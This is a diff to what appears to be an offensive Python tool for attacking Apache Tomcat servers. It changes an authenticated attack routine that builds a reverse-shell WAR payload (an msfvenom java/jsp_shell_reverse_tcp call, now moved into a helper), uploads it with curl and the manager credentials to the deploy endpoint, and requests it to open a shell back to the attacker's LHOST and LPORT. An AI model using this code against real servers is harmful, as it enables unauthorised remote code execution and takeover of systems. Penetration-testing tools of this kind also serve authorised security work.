@@ -13,8 +13,6 @@ from zipfile import ZipFile
 
 import requests
 from requests.auth import HTTPBasicAuth
-from packaging.version import Version
-
 from bs4 import BeautifulSoup
 
 from rich.console import Console
@@ -218,21 +216,17 @@ class authenticated_attack(tomcat):
 
                 filename = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
 
-                response = requests.get(url=f"{self.url}/reverse_shell/index.jsp")
+                response = requests.get(url=f"{self.url}/reverse")
 
                 output.message(state="settings", description=f"LHOST: {args.lhost} - LPORT: {args.lport}", clear_before=False)
 
                 if response.status_code != 200:
 
-                    war_files = glob.glob("resources/*.war")
+                    # generate part
 
-                    for war_file in war_files:
-                        if not war_file == 'web_shell.war':
-                            os.remove(war_file)
+                    filename = core.utils.generate_payload(filename=filename, lhost=args.lhost, lport=args.lport)
 
-                    subprocess.run(
-                        ["msfvenom", "-p", "java/jsp_shell_reverse_tcp", f"LHOST={args.lhost}", f"LPORT={args.lport}",
-                         "-f", "war", "-o", f"resources/{filename}.war"], check=True, capture_output=True)
+                    # deploy part
 
                     command = f"curl --upload-file resources/{filename}.war -u '{self.username}:{self.password}' '{self.url}/manager/text/deploy?path=/reverse'"
                     subprocess.run(command, shell=True, check=True, capture_output=True)
